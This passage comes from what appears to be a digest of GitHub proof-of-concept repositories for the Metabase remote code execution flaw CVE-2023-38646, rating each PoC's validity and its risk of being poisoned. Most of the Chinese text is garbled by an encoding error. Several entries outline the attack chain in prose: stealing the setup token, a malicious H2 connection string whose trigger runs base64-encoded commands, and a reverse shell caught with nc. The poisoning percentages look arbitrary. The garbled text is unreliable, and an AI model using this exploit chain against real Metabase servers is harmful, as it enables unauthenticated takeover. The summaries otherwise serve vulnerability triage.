3.  **å‘é€Exploitï¼š** é€šè¿‡ POST è¯·æ±‚å°†æ„é€ çš„ payload å‘é€åˆ° Metabase æœåŠ¡å™¨ã€‚
4.  **åå¼¹ Shellï¼š** æ”»å‡»è€…ä½¿ç”¨ `nc` ç›‘å¬æŒ‡å®šç«¯å£ï¼Œç­‰å¾…ç›®æ ‡æœåŠ¡å™¨æ‰§è¡Œå‘½ä»¤ååå¼¹ shellã€‚

**æœ‰æ•ˆæ€§ï¼š**

æ ¹æ®æä¾›çš„æ¼æ´ä¿¡æ¯å’ŒPoCä»£ç ï¼Œæ­¤æ¼æ´çš„åˆ©ç”¨æ˜¯æœ‰æ•ˆçš„ã€‚æ¼æ´åº“ä¿¡æ¯æ˜ç¡®æŒ‡å‡ºæ— éœ€èº«ä»½éªŒè¯å³å¯åˆ©ç”¨æ­¤æ¼æ´æ‰§è¡Œä»»æ„å‘½ä»¤ã€‚æœç´¢å¼•æ“ç»“æœä¸­ä¹ŸåŒ…å«å¤§é‡å…³äºæ­¤æ¼æ´çš„åˆ†æå’Œåˆ©ç”¨æ–‡ç« ï¼Œè¿›ä¸€æ­¥éªŒè¯äº†å…¶æœ‰æ•ˆæ€§ã€‚PoCä»£ç æä¾›äº†è‡ªåŠ¨åŒ–åˆ©ç”¨çš„è„šæœ¬ã€‚

**æŠ•æ¯’é£é™©ï¼š**

æä¾›çš„ PoC ä»£ç ä¸­å­˜åœ¨æ½œåœ¨çš„æŠ•æ¯’é£é™©ã€‚è™½ç„¶ä¸»è¦åŠŸèƒ½æ˜¯åˆ©ç”¨æ¼æ´ï¼Œä½†ä»£ç ä¸­å¯èƒ½åŒ…å«ä»¥ä¸‹æ½œåœ¨é£é™©ï¼š

*   **åå¼¹ Shell åœ°å€ï¼š** PoC ä»£ç å…è®¸ç”¨æˆ·æŒ‡å®šåå¼¹ shell çš„ IP åœ°å€å’Œç«¯å£ï¼Œä½†å¦‚æœç”¨æˆ·ä¸å°å¿ƒä½¿ç”¨äº†æ”»å‡»è€…æ§åˆ¶çš„ IP åœ°å€å’Œç«¯å£ï¼Œå¯èƒ½ä¼šè¢«åå¼¹ shellï¼Œå¯¼è‡´è‡ªèº«ç³»ç»Ÿè¢«æ”»å‡»è€…æ§åˆ¶ã€‚
*   **å…¶ä»–æ¶æ„å‘½ä»¤ï¼š**  æ”»å‡»è€…å¯èƒ½ä¼šä¿®æ”¹ PoC ä»£ç ï¼Œæ·»åŠ é¢å¤–çš„æ¶æ„å‘½ä»¤ï¼Œä¾‹å¦‚åˆ é™¤æ–‡ä»¶ã€ä¿®æ”¹ç³»ç»Ÿé…ç½®ç­‰ã€‚ä»£ç ä¸­çš„`convert_command`å‡½æ•°å’Œ`create_payload`å‡½æ•°å¯ä»¥è¢«ä¿®æ”¹æ³¨å…¥æ¶æ„ä»£ç ã€‚
*   **ä¾èµ–é¡¹é£é™©ï¼š** è™½ç„¶PoCä»£ç ä¾èµ–çš„requestsåº“æœ¬èº«é£é™©è¾ƒä½ï¼Œä½†æ˜¯å¦‚æœæ”»å‡»è€…æä¾›ä¿®æ”¹è¿‡çš„poc,å¢åŠ å…¶ä»–æ¶æ„ä¾èµ–åº“, å¯èƒ½ä¼šå­˜åœ¨å®‰å…¨é£é™©ã€‚

ç»¼åˆåˆ†æï¼ŒæŠ•æ¯’é£é™©è¯„ä¼°ä¸º 10%ï¼Œä¸»è¦é£é™©é›†ä¸­åœ¨ç”¨æˆ·é”™è¯¯ä½¿ç”¨æˆ–æ¶æ„ä¿®æ”¹ PoC ä»£ç çš„å¯èƒ½æ€§ä¸Šã€‚

**é¡¹ç›®åœ°å€:** [JayRyz/CVE-2023-38646-PoC-Metabase](https://github.com/JayRyz/CVE-2023-38646-PoC-Metabase)

**æ¼æ´è¯¦æƒ…:** [CVE-2023-38646](https://nvd.nist.gov/vuln/detail/CVE-2023-38646)

---

## POC #9

**æ¥æº**: [CVE-2023-38646-Mrunalkaran_CVE-2023-38646.md](../2023/CVE-2023-38646-Mrunalkaran_CVE-2023-38646.md)

## CVE-2023-38646-Metabase-RCE

**æ¼æ´ç¼–å·:** CVE-2023-38646

**æ¼æ´ç±»å‹:** è¿œç¨‹ä»£ç æ‰§è¡Œ(RCE)

**å½±å“åº”ç”¨:** Metabase

**å±å®³ç­‰çº§:** é«˜å±ï¼Œå…è®¸æœªç»èº«ä»½éªŒè¯çš„æ”»å‡»è€…ä»¥æœåŠ¡å™¨æƒé™æ‰§è¡Œä»»æ„å‘½ä»¤

**å½±å“ç‰ˆæœ¬:** Metabase open source versions before 0.46.6.1 and Metabase Enterprise versions before 1.46.6.1

**åˆ©ç”¨æ¡ä»¶:** ç›®æ ‡Metabaseå®ä¾‹è¿è¡Œåœ¨å—å½±å“çš„ç‰ˆæœ¬ï¼Œä¸”ç½‘ç»œå¯è¾¾ã€‚

**POC å¯ç”¨æ€§:** æ˜¯

**æŠ•æ¯’é£é™©:** 1%

## è¯¦æƒ…

CVE-2023-38646æ˜¯ä¸€ä¸ªå­˜åœ¨äºMetabase 0.46.6.1ä¹‹å‰ç‰ˆæœ¬å’ŒMetabase Enterprise 1.46.6.1ä¹‹å‰ç‰ˆæœ¬çš„è¿œç¨‹ä»£ç æ‰§è¡Œæ¼æ´ã€‚æ”»å‡»è€…æ— éœ€èº«ä»½éªŒè¯å³å¯åˆ©ç”¨æ­¤æ¼æ´ï¼Œé€šè¿‡ç²¾å¿ƒæ„é€ çš„è¯·æ±‚ï¼Œåœ¨æœåŠ¡å™¨ä¸Šæ‰§è¡Œä»»æ„å‘½ä»¤ï¼Œä»è€Œå®Œå…¨æ§åˆ¶ç³»ç»Ÿã€‚

**åˆ©ç”¨æ–¹å¼ï¼š**

1.  **è·å–Setup Token:** POCè„šæœ¬é¦–å…ˆå°è¯•ä»`/api/session/properties`ç«¯ç‚¹è·å–setup-tokenï¼Œè¿™ä¸ªtokenç”¨äºåç»­çš„åˆ©ç”¨ã€‚
2.  **æ„é€ æ¶æ„Payload:**  è„šæœ¬æ„é€ ä¸€ä¸ªåŒ…å«æ¶æ„H2æ•°æ®åº“è¿æ¥å­—ç¬¦ä¸²çš„JSON payloadã€‚è¯¥è¿æ¥å­—ç¬¦ä¸²åˆ©ç”¨H2æ•°æ®åº“çš„ç‰¹æ€§ï¼Œåœ¨è¿æ¥æ—¶æ‰§è¡Œä»»æ„Javaä»£ç ã€‚å…·ä½“æ¥è¯´ï¼Œå®ƒåˆ›å»ºäº†ä¸€ä¸ªè§¦å‘å™¨ï¼Œåœ¨è®¿é—® `INFORMATION_SCHEMA.TABLES` è¡¨æ—¶æ‰§è¡Œä¸€æ®µ JavaScript ä»£ç ã€‚
3.  **æ‰§è¡Œå‘½ä»¤:**  JavaScript ä»£ç è°ƒç”¨ `java.lang.Runtime.getRuntime().exec()` æ¥æ‰§è¡Œä¸€ä¸ªåŒ…å«base64ç¼–ç çš„bashå‘½ä»¤ã€‚æ­¤å‘½ä»¤è§£ç å¹¶æ‰§è¡Œåå‘shellå‘½ä»¤ã€‚
4.  **å‘é€Payload:**  æ„é€ å¥½çš„payloadé€šè¿‡POSTè¯·æ±‚å‘é€åˆ°`/api/setup/validate`ç«¯ç‚¹ã€‚
5.  **åå‘Shell:**  å¦‚æœæ¼æ´åˆ©ç”¨æˆåŠŸï¼Œæ”»å‡»è€…å°†åœ¨æŒ‡å®šçš„IPåœ°å€å’Œç«¯å£ä¸Šè·å¾—ä¸€ä¸ªåå‘shellã€‚

**æŠ•æ¯’é£é™©åˆ†æï¼š**

æä¾›çš„ä»£ç ä¸»è¦æ˜¯åˆ©ç”¨æ¼æ´è·å–åå‘shellã€‚é€šè¿‡æ£€æŸ¥ä»£ç ï¼Œæ²¡æœ‰å‘ç°æ˜æ˜¾çš„æ¶æ„ä»£ç ï¼Œä¾‹å¦‚åˆ é™¤æ–‡ä»¶ã€ä¼ æ’­æ¶æ„è½¯ä»¶ç­‰ã€‚ä»£ç ç»“æ„æ¸…æ™°ï¼Œç›®çš„æ˜¯åˆ©ç”¨æ¼æ´ã€‚è™½ç„¶ä»£ç æœ¬èº«æ˜¯ä¸ºäº†æ”»å‡»ï¼Œä½†å®ƒæ²¡æœ‰ä¸»åŠ¨è¿›è¡Œæ¶æ„ä¼ æ’­æˆ–å…¶ä»–ç ´åè¡Œä¸ºã€‚è€ƒè™‘åˆ°ä»£ç çš„åŠŸèƒ½ä¸»è¦æ˜¯æ¼æ´åˆ©ç”¨ï¼Œè€Œéæ¤å…¥åé—¨æˆ–è¿›è¡Œå…¶ä»–æ¶æ„æ´»åŠ¨ï¼Œå› æ­¤åˆ¤å®šå­˜åœ¨æŠ•æ¯’ä»£ç çš„å¯èƒ½æ€§è¾ƒä½ã€‚

è¯¥é¡¹ç›®ä¸­å¯èƒ½å­˜åœ¨æŠ•æ¯’çš„é£é™©è¾ƒä½ï¼Œè¯„ä¼°ç»“æœä¸º1%ã€‚

**é¡¹ç›®åœ°å€:** [Mrunalkaran/CVE-2023-38646](https://github.com/Mrunalkaran/CVE-2023-38646)

**æ¼æ´è¯¦æƒ…:** [CVE-2023-38646](https://nvd.nist.gov/vuln/detail/CVE-2023-38646)

---

## POC #10

**æ¥æº**: [CVE-2023-38646-Pyr0sec_CVE-2023-38646.md](../2023/CVE-2023-38646-Pyr0sec_CVE-2023-38646.md)

## CVE-2023-38646-Metabase-RCE

**æ¼æ´ç¼–å·:** CVE-2023-38646

**æ¼æ´ç±»å‹:** è¿œç¨‹ä»£ç æ‰§è¡Œ (RCE)

**å½±å“åº”ç”¨:** Metabase

**å±å®³ç­‰çº§:** é«˜å±ï¼Œå…è®¸æœªç»èº«ä»½éªŒè¯çš„æ”»å‡»è€…åœ¨æœåŠ¡å™¨ä¸Šæ‰§è¡Œä»»æ„å‘½ä»¤

**å½±å“ç‰ˆæœ¬:** < 0.46.6.1 (Open Source) å’Œ < 1.46.6.1 (Enterprise)

**åˆ©ç”¨æ¡ä»¶:** ç›®æ ‡ç³»ç»Ÿè¿è¡Œå—å½±å“ç‰ˆæœ¬çš„Metabaseï¼Œä¸”æ”»å‡»è€…èƒ½å¤Ÿé€šè¿‡ç½‘ç»œè®¿é—®è¯¥Metabaseå®ä¾‹ã€‚

**POC å¯ç”¨æ€§:** æ˜¯

**æŠ•æ¯’é£é™©:** 2%

## è¯¦æƒ…

CVE-2023-38646æ˜¯ä¸€ä¸ªå­˜åœ¨äºMetabaseçš„è¿œç¨‹ä»£ç æ‰§è¡Œæ¼æ´ã€‚æ ¹æ®æ¼æ´åº“ä¿¡æ¯å’Œæœç´¢å¼•æ“ç»“æœï¼Œè¯¥æ¼æ´å…è®¸æœªç»èº«ä»½éªŒè¯çš„æ”»å‡»è€…åœ¨å—å½±å“çš„MetabaseæœåŠ¡å™¨ä¸Šæ‰§è¡Œä»»æ„å‘½ä»¤ã€‚å¤šä¸ªä¿¡æ¯æ¥æºéƒ½ç¡®è®¤äº†æ­¤æ¼æ´çš„å­˜åœ¨å’Œé«˜å±æ€§ï¼Œå¹¶æä¾›äº†å¯åˆ©ç”¨çš„POCã€‚æ¼æ´åˆ©ç”¨æ–¹å¼é€šå¸¸æ¶‰åŠæ„é€ æ¶æ„çš„è¯·æ±‚ï¼Œè§¦å‘Metabaseä¸­çš„ååºåˆ—åŒ–æˆ–å…¶ä»–ç±»å‹çš„æ¼æ´ï¼Œä»è€Œæ‰§è¡Œæ”»å‡»è€…æä¾›çš„æ¶æ„ä»£ç ã€‚

**æœ‰æ•ˆæ€§ï¼š** æ¼æ´åº“ä¿¡æ¯å’Œå¤šä¸ªæœç´¢å¼•æ“ç»“æœè¡¨æ˜å­˜åœ¨å…¬å¼€å¯ç”¨çš„PoCï¼Œè¯æ˜äº†æ¼æ´çš„å¯åˆ©ç”¨æ€§ã€‚

**æŠ•æ¯’é£é™©ï¼š** æä¾›çš„æ¼æ´åˆ©ç”¨ä»£ç åªåŒ…å«Apache Licenseã€‚å¹¶æ²¡æœ‰å‘ç°ä»»ä½•ç›´æ¥çš„æŠ•æ¯’ä»£ç ã€‚é€šå¸¸ï¼ŒæŠ•æ¯’å¯èƒ½å­˜åœ¨äºæ›´å¤æ‚çš„expæˆ–è€…åº“çš„ä¾èµ–ä¸­,ä¾‹å¦‚ï¼Œä¸€äº›å¼€å‘è€…å¯èƒ½åœ¨çœ‹ä¼¼æ— å®³çš„ä»£ç ä¸­åµŒå…¥åé—¨ï¼Œè¿™äº›åé—¨åœ¨ç‰¹å®šæ¡ä»¶ä¸‹è¢«è§¦å‘ï¼Œä»è€Œå…è®¸æ”»å‡»è€…è¿œç¨‹æ§åˆ¶å—æ„ŸæŸ“çš„ç³»ç»Ÿã€‚æœ¬æ¬¡PoCçš„æŠ•æ¯’åˆ†æå æ¯”ä¸º2%ã€‚

**åˆ©ç”¨æ–¹å¼ï¼š**

1.  **ç¡®å®šç›®æ ‡ï¼š** ç¡®å®šè¿è¡ŒMetabaseçš„æœåŠ¡å™¨ï¼Œå¹¶ç¡®è®¤å…¶ç‰ˆæœ¬æ˜¯å¦åœ¨å—å½±å“çš„èŒƒå›´å†…ï¼ˆä½äº0.46.6.1çš„å¼€æºç‰ˆæœ¬æˆ–ä½äº1.46.6.1çš„ä¼ä¸šç‰ˆæœ¬ï¼‰ã€‚
2.  **æ„é€ æ¶æ„è¯·æ±‚ï¼š** ä½¿ç”¨å·²çŸ¥çš„PoCæˆ–expæ„é€ åŒ…å«æ¶æ„ä»£ç çš„è¯·æ±‚ã€‚å…·ä½“çš„è¯·æ±‚æ ¼å¼å–å†³äºæ¼æ´çš„ç»†èŠ‚ï¼Œå¯èƒ½æ¶‰åŠå‘é€ç‰¹åˆ¶çš„JSONæ•°æ®ã€åˆ©ç”¨SQLæ³¨å…¥æˆ–å…¶ä»–ç±»å‹çš„æ¼æ´ã€‚
3.  **å‘é€è¯·æ±‚ï¼š** å°†æ„é€ çš„æ¶æ„è¯·æ±‚å‘é€åˆ°MetabaseæœåŠ¡å™¨çš„ç‰¹å®šç«¯ç‚¹ã€‚
4.  **æ‰§è¡Œä»£ç ï¼š** å¦‚æœæ¼æ´åˆ©ç”¨æˆåŠŸï¼ŒMetabaseæœåŠ¡å™¨å°†æ‰§è¡Œæ”»å‡»è€…æä¾›çš„æ¶æ„ä»£ç ï¼Œä»è€Œå…è®¸æ”»å‡»è€…æ§åˆ¶æœåŠ¡å™¨ã€‚


**é¡¹ç›®åœ°å€:** [Pyr0sec/CVE-2023-38646](https://github.com/Pyr0sec/CVE-2023-38646)

**æ¼æ´è¯¦æƒ…:** [CVE-2023-38646](https://nvd.nist.gov/vuln/detail/CVE-2023-38646)

---

## POC #11

**æ¥æº**: [CVE-2023-38646-Red4mber_CVE-2023-38646.md](../2023/CVE-2023-38646-Red4mber_CVE-2023-38646.md)

## CVE-2023-38646-Metabase-RCE

**æ¼æ´ç¼–å·:** CVE-2023-38646

**æ¼æ´ç±»å‹:** è¿œç¨‹ä»£ç æ‰§è¡Œ(RCE)

**å½±å“åº”ç”¨:** Metabase

**å±å®³ç­‰çº§:** é«˜å±ï¼Œå…è®¸æœªç»èº«ä»½éªŒè¯çš„æ”»å‡»è€…åœ¨æœåŠ¡å™¨ä¸Šæ‰§è¡Œä»»æ„å‘½ä»¤

**å½±å“ç‰ˆæœ¬:** < 0.46.6.1 (å¼€æºç‰ˆ), < 1.46.6.1 (ä¼ä¸šç‰ˆ)

**åˆ©ç”¨æ¡ä»¶:** ç›®æ ‡Metabaseå®ä¾‹ç‰ˆæœ¬åœ¨å—å½±å“èŒƒå›´å†…ï¼Œä¸”æœªè¿›è¡Œç›¸åº”è¡¥ä¸ä¿®å¤ã€‚

**POC å¯ç”¨æ€§:** æ˜¯

**æŠ•æ¯’é£é™©:** 1%

## è¯¦æƒ…

CVE-2023-38646 æ˜¯ Metabase ä¸­çš„ä¸€ä¸ªè¿œç¨‹ä»£ç æ‰§è¡Œæ¼æ´ã€‚æœªç»èº«ä»½éªŒè¯çš„æ”»å‡»è€…å¯ä»¥é€šè¿‡æ„é€ ç‰¹æ®Šçš„è¯·æ±‚åˆ©ç”¨æ­¤æ¼æ´åœ¨ Metabase æœåŠ¡å™¨ä¸Šæ‰§è¡Œä»»æ„å‘½ä»¤ã€‚

**åˆ©ç”¨æ–¹å¼ï¼š**

1.  **è·å– Setup Tokenï¼š** æ”»å‡»è€…é¦–å…ˆå‘ `/api/session/properties` ç«¯ç‚¹å‘é€ GET è¯·æ±‚ï¼Œä»¥è·å– `setup-token`ã€‚è¿™ä¸ªtokenç”¨äºåç»­çš„åˆ©ç”¨ã€‚
2.  **æ„é€ æ¶æ„è¯·æ±‚ï¼š** æ”»å‡»è€…æ„é€ ä¸€ä¸ªåŒ…å«æ¶æ„ SQL æ³¨å…¥çš„ JSON payloadï¼Œå¹¶å°†å…¶å‘é€åˆ° `/api/setup/validate` ç«¯ç‚¹ã€‚
    *   Payload çš„ `details` å­—æ®µåŒ…å«ä¸€ä¸ªæ¶æ„çš„ H2 æ•°æ®åº“è¿æ¥å­—ç¬¦ä¸²ï¼Œå…¶ä¸­ `TRACE_LEVEL_SYSTEM_OUT=1` å¼€å¯äº†è·Ÿè¸ªï¼Œ`CREATE TRIGGER` ç”¨äºåˆ›å»ºä¸€ä¸ªè§¦å‘å™¨ï¼Œåœ¨è®¿é—® `INFORMATION_SCHEMA.TABLES` è¡¨æ—¶æ‰§è¡Œ JavaScript ä»£ç ã€‚
    *   JavaScript ä»£ç ä½¿ç”¨ `java.lang.Runtime.getRuntime().exec()` æ‰§è¡Œç»è¿‡ Base64 ç¼–ç çš„å‘½ä»¤ã€‚
3.  **æ‰§è¡Œå‘½ä»¤ï¼š** å½“ Metabase å°è¯•éªŒè¯æ•°æ®åº“è¿æ¥æ—¶ï¼Œæ¶æ„ SQL æ³¨å…¥ä¼šè¢«è§¦å‘ï¼Œä»è€Œæ‰§è¡Œæ”»å‡»è€…æä¾›çš„å‘½ä»¤ã€‚

**æœ‰æ•ˆæ€§è¯„ä¼°ï¼š**

æä¾›çš„PoCä»£ç æœ‰æ•ˆã€‚ä»£ç é€šè¿‡å‘é€æ¶æ„è¯·æ±‚åˆ° `/api/setup/validate` æ¥å£æ¥è§¦å‘æ¼æ´ã€‚ä»£ç é¦–å…ˆé€šè¿‡`/api/session/properties`è·å–tokenï¼Œç„¶åä½¿ç”¨åŒ…å«æ¶æ„SQLæ³¨å…¥çš„JSONæ•°æ®åŒ…é€šè¿‡POSTæ–¹æ³•å‘é€åˆ°ç›®æ ‡æœåŠ¡å™¨ã€‚

**æŠ•æ¯’é£é™©è¯„ä¼°ï¼š**

è¯¥POCä»£ç ä¸»è¦åŠŸèƒ½æ˜¯åˆ©ç”¨æ¼æ´å®ç°RCEï¼Œæ²¡æœ‰æ˜æ˜¾çš„æŠ•æ¯’è¡Œä¸ºã€‚
è™½ç„¶å­˜åœ¨æ‰§è¡Œä»»æ„å‘½ä»¤çš„é£é™©ï¼Œä½†æ˜¯payloadæ˜¯ç”±ä½¿ç”¨è€…æä¾›çš„ã€‚ä»£ç æœ¬èº«åªè´Ÿè´£æ„é€ å’Œå‘é€è¯·æ±‚ï¼Œé£é™©æ˜¯RCEæœ¬èº«å¸¦æ¥çš„ï¼Œè€Œä¸æ˜¯ä»£ç ä½œè€…æ¤å…¥çš„åé—¨ã€‚
å­˜åœ¨æä½çš„æŠ•æ¯’é£é™© (å¤§çº¦1%)ï¼Œè¯¥é£é™©æ¥è‡ªäºä½œè€…å¯èƒ½ä¼šåœ¨ä»£ç é€»è¾‘ä¸Šå­˜åœ¨ä¸€äº›éšè—çš„åé—¨ï¼Œä½†æ˜¯ä»£ç æ•´ä½“ç»“æ„å’Œé€»è¾‘éƒ½æ¯”è¾ƒç®€å•ï¼Œéšè—åé—¨çš„éš¾åº¦è¾ƒé«˜ã€‚


**é¡¹ç›®åœ°å€:** [Red4mber/CVE-2023-38646](https://github.com/Red4mber/CVE-2023-38646)

**æ¼æ´è¯¦æƒ…:** [CVE-2023-38646](https://nvd.nist.gov/vuln/detail/CVE-2023-38646)

---

## POC #12

**æ¥æº**: [CVE-2023-38646-Shisones_MetabaseRCE_CVE-2023-38646.md](../2023/CVE-2023-38646-Shisones_MetabaseRCE_CVE-2023-38646.md)

## CVE-2023-38646-Metabase-RCE

**æ¼æ´ç¼–å·:** CVE-2023-38646

**æ¼æ´ç±»å‹:** è¿œç¨‹ä»£ç æ‰§è¡Œ

**å½±å“åº”ç”¨:** Metabase

**å±å®³ç­‰çº§:** é«˜å±ï¼Œå…è®¸æœªç»èº«ä»½éªŒè¯çš„æ”»å‡»è€…ä»¥æœåŠ¡å™¨æƒé™æ‰§è¡Œä»»æ„å‘½ä»¤

**å½±å“ç‰ˆæœ¬:** Metabase open source before 0.46.6.1 and Metabase Enterprise before 1.46.6.1

**åˆ©ç”¨æ¡ä»¶:** ç›®æ ‡Metabaseå®ä¾‹å¯è¢«ç½‘ç»œè®¿é—®

**POC å¯ç”¨æ€§:** æ˜¯

**æŠ•æ¯’é£é™©:** 10%

## è¯¦æƒ…

CVE-2023-38646 å…è®¸æœªç»èº«ä»½éªŒè¯çš„æ”»å‡»è€…åœ¨å—å½±å“çš„ Metabase å®ä¾‹ä¸Šæ‰§è¡Œè¿œç¨‹ä»£ç ã€‚æ ¹æ®æ¼æ´åº“ä¿¡æ¯ã€æœç´¢ç»“æœå’Œæ¼æ´åˆ©ç”¨ä»£ç ï¼Œæ­¤æ¼æ´åˆ©ç”¨æœ‰æ•ˆã€‚åˆ©ç”¨æ–¹å¼æ¶‰åŠå‘é€ç‰¹åˆ¶çš„è¯·æ±‚åˆ° Metabase æœåŠ¡å™¨ï¼Œåˆ©ç”¨å…¶å­˜åœ¨çš„æ¼æ´æ‰§è¡Œä»»æ„å‘½ä»¤ã€‚

**æœ‰æ•ˆæ€§ï¼š**

æ ¹æ®æ¼æ´åº“ä¿¡æ¯å’Œæœç´¢ç»“æœï¼Œè¯¥æ¼æ´å·²ç¡®è®¤å¹¶ä¸”å­˜åœ¨å¯åˆ©ç”¨çš„PoCã€‚æœç´¢å¼•æ“ç»“æœä¸­å¤šä¸ªé“¾æ¥æŒ‡å‘äº†æ¼æ´çš„è¯¦ç»†æè¿°ã€åˆ©ç”¨æ–¹æ³•å’ŒPoCä»£ç ï¼Œè¯æ˜äº†å…¶æœ‰æ•ˆæ€§ã€‚

**æŠ•æ¯’é£é™©ï¼š**

æä¾›çš„Cargo.lockæ–‡ä»¶åªæ˜¯Rusté¡¹ç›®çš„ä¾èµ–é”å®šæ–‡ä»¶ï¼Œæœ¬èº«ä¸åŒ…å«å¯æ‰§è¡Œä»£ç ã€‚è¯„ä¼°æŠ•æ¯’é£é™©éœ€è¦æŸ¥çœ‹å®Œæ•´çš„æºä»£ç ï¼Œä½†ä»…å‡­Cargo.lockæ–‡ä»¶å¾ˆéš¾åˆ¤æ–­æ˜¯å¦å­˜åœ¨æ¶æ„ä»£ç ã€‚è€ƒè™‘åˆ°ç¼ºä¹ç›´æ¥çš„æ¶æ„ä»£ç è¯æ®ï¼Œä»¥åŠæ¼æ´åˆ©ç”¨ä¸»è¦ä¾èµ–äºMetabaseæœ¬èº«çš„æ¼æ´ï¼ŒæŠ•æ¯’é£é™©è¾ƒä½ï¼Œä¼°è®¡ä¸º10%ã€‚

**åˆ©ç”¨æ–¹å¼ï¼š**

æ ¹æ®æœç´¢ç»“æœï¼Œæ”»å‡»è€…åˆ©ç”¨æ­¤æ¼æ´ï¼Œé€šè¿‡å‘é€ç‰¹åˆ¶çš„æ¶æ„è¯·æ±‚åˆ°MetabaseæœåŠ¡å™¨ï¼Œä»è€Œæ‰§è¡Œä»»æ„å‘½ä»¤ã€‚æ— éœ€èº«ä»½éªŒè¯å³å¯è§¦å‘æ­¤æ¼æ´ã€‚


**é¡¹ç›®åœ°å€:** [Shisones/MetabaseRCE_CVE-2023-38646](https://github.com/Shisones/MetabaseRCE_CVE-2023-38646)

**æ¼æ´è¯¦æƒ…:** [CVE-2023-38646](https://nvd.nist.gov/vuln/detail/CVE-2023-38646)

---

## POC #13

**æ¥æº**: [CVE-2023-38646-UserConnecting_Exploit-CVE-2023-38646-Metabase.md](../2023/CVE-2023-38646-UserConnecting_Exploit-CVE-2023-38646-Metabase.md)

## CVE-2023-38646-Metabase-RCE

**æ¼æ´ç¼–å·:** CVE-2023-38646

**æ¼æ´ç±»å‹:** è¿œç¨‹ä»£ç æ‰§è¡Œ (RCE)

**å½±å“åº”ç”¨:** Metabase

**å±å®³ç­‰çº§:** é«˜å±ï¼Œæ— éœ€èº«ä»½éªŒè¯å³å¯æ‰§è¡Œä»»æ„å‘½ä»¤

**å½±å“ç‰ˆæœ¬:** 0.46.6.1ä¹‹å‰ (å¼€æºç‰ˆ), 1.46.6.1ä¹‹å‰ (ä¼ä¸šç‰ˆ)

**åˆ©ç”¨æ¡ä»¶:** ç›®æ ‡Metabaseå®ä¾‹ç‰ˆæœ¬å—å½±å“ï¼Œå¹¶ä¸”å¯ä»¥é€šè¿‡ç½‘ç»œè®¿é—®ã€‚

**POC å¯ç”¨æ€§:** æ˜¯

**æŠ•æ¯’é£é™©:** 1%

## è¯¦æƒ…

CVE-2023-38646 å…è®¸æœªç»èº«ä»½éªŒè¯çš„æ”»å‡»è€…åœ¨ Metabase æœåŠ¡å™¨ä¸Šä»¥æœåŠ¡å™¨çš„æƒé™çº§åˆ«æ‰§è¡Œä»»æ„å‘½ä»¤ã€‚æ ¹æ®æ¼æ´åº“ä¿¡æ¯ã€æœç´¢ç»“æœå’Œæä¾›çš„æ¼æ´åˆ©ç”¨ä»£ç ï¼Œæ­¤æ¼æ´çš„åˆ©ç”¨æ–¹å¼æ˜¯ï¼š

1.  **æ¼æ´åŸç†ï¼š** è¯¥æ¼æ´å­˜åœ¨äº Metabase çš„ `/api/setup/validate` æ¥å£ï¼Œåˆ©ç”¨äº† H2 æ•°æ®åº“çš„ç‰¹æ€§ï¼Œé€šè¿‡åœ¨æ•°æ®åº“è¿æ¥å­—ç¬¦ä¸²ä¸­æ’å…¥æ¶æ„ SQL è¯­å¥æ¥æ‰§è¡Œä»»æ„ä»£ç ã€‚
2.  **åˆ©ç”¨æ­¥éª¤ï¼š**
    *   **è·å– `setup-token`ï¼š**  é€šè¿‡è®¿é—® `/api/session/properties` è·å– `setup-token`ã€‚
    *   **æ„é€ æ¶æ„è¯·æ±‚ï¼š**  æ„é€ ä¸€ä¸ªåŒ…å«æ¶æ„ H2 è¿æ¥å­—ç¬¦ä¸²çš„ JSON payloadï¼Œè¯¥è¿æ¥å­—ç¬¦ä¸²åŒ…å«ä¸€ä¸ª `CREATE TRIGGER` è¯­å¥ï¼Œè¯¥è¯­å¥åœ¨æ¯æ¬¡æŸ¥è¯¢ `INFORMATION_SCHEMA.TABLES` æ—¶æ‰§è¡Œç³»ç»Ÿå‘½ä»¤ã€‚
    *   **å‘é€è¯·æ±‚ï¼š**  å°†æ„é€ çš„ JSON payload å‘é€åˆ° `/api/setup/validate` æ¥å£ã€‚

3.  **POC åˆ†æï¼š** æä¾›çš„ Python è„šæœ¬ `metabase_exploit.py` å®ç°äº†ä¸Šè¿°æ­¥éª¤ï¼š
    *   å®ƒæ¥å— Metabase çš„ URLã€`setup-token`ã€æ“ä½œç±»å‹ï¼ˆ`exec` æˆ– `revshell`ï¼‰å’Œå‘½ä»¤ä½œä¸ºå‚æ•°ã€‚
    *   å®ƒä½¿ç”¨ `command_encoding` å‡½æ•°å¯¹å‘½ä»¤è¿›è¡Œ Base64 ç¼–ç ï¼Œå¹¶å¤„ç†å¡«å……å­—ç¬¦ `=`ã€‚
    *   å®ƒæ„é€ åŒ…å«æ¶æ„ H2 è¿æ¥å­—ç¬¦ä¸²çš„ JSON payloadã€‚
    *   å®ƒå‘é€ POST è¯·æ±‚åˆ° `/api/setup/validate` æ¥å£ã€‚

4.  **æœ‰æ•ˆæ€§ï¼š** æ ¹æ®æ¼æ´æè¿°å’Œæä¾›çš„ PoC ä»£ç ï¼Œè¯¥ PoC æ˜¯æœ‰æ•ˆçš„ï¼Œå¯ä»¥åœ¨æœªæˆæƒçš„æƒ…å†µä¸‹æ‰§è¡Œä»»æ„ä»£ç ã€‚

5.  **æŠ•æ¯’é£é™©ï¼š**
    *   ä»£ç ä¸»è¦åŠŸèƒ½æ˜¯æ„é€ å¹¶å‘é€æ¶æ„è¯·æ±‚ï¼Œé£é™©è¾ƒä½ã€‚
    *   `command_encoding` å‡½æ•°çœ‹èµ·æ¥æ­£å¸¸ï¼Œç”¨äºé¿å…Base64ç¼–ç ä¸­çš„å¡«å……å­—ç¬¦çš„é—®é¢˜ï¼Œä½†ä¹Ÿæœ‰å¯èƒ½å­˜åœ¨å…¶ä»–ç¼–ç æ¼æ´ã€‚
    *   ä»£ç æ˜ç¡®å£°æ˜ä»…ç”¨äºæ•™è‚²ç›®çš„ï¼Œä½†ä¸èƒ½å®Œå…¨æ’é™¤ä½œè€…æ¤å…¥åé—¨çš„å¯èƒ½ã€‚
    *   æ€»ä½“è€Œè¨€ï¼ŒæŠ•æ¯’é£é™©è¾ƒä½ï¼Œå¤§æ¦‚åœ¨1%å·¦å³ã€‚ä¸»è¦é£é™©åœ¨äºä½¿ç”¨è€…æ˜¯å¦ä¼šç”¨æ­¤ä»£ç æ‰§è¡Œéæ³•æ“ä½œã€‚

